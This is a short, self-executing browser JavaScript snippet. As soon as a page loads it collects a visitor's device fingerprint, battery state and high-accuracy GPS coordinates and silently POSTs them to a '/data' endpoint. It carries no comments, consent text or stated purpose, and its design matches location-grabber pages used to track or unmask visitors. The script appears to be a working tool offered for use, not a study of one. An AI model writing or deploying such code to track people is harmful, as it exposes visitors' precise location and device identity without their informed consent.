(async function() {
  async function getBatteryInfo() {
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        return {
          level: `${Math.round(battery.level * 100)}%`,
          charging: battery.charging
        };
      } catch {
        return null;
      }
    }
    return null;
  }

  function getLocationInfo() {
    return new Promise(resolve => {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            resolve({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            });
          },
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 7000 }
        );
      } else {
        resolve(null);
      }
    });
  }

  function getClientInfo() {
    return {
      userAgent: navigator.userAgent || null,
      language: navigator.language || null,
      platform: navigator.platform || null,
      memory: navigator.deviceMemory || null,
      cores: navigator.hardwareConcurrency || null,
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      referrer: document.referrer || null
    };
  }

  async function sendData(payload) {
    try {
      await fetch("/data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      console.error("[X] Gagal kirim data:", err);
    }
  }

  const data = getClientInfo();
  data.battery = await getBatteryInfo();
  data.location = await getLocationInfo();
  data.timestamp = new Date().toISOString();

  await sendData(data);
})();
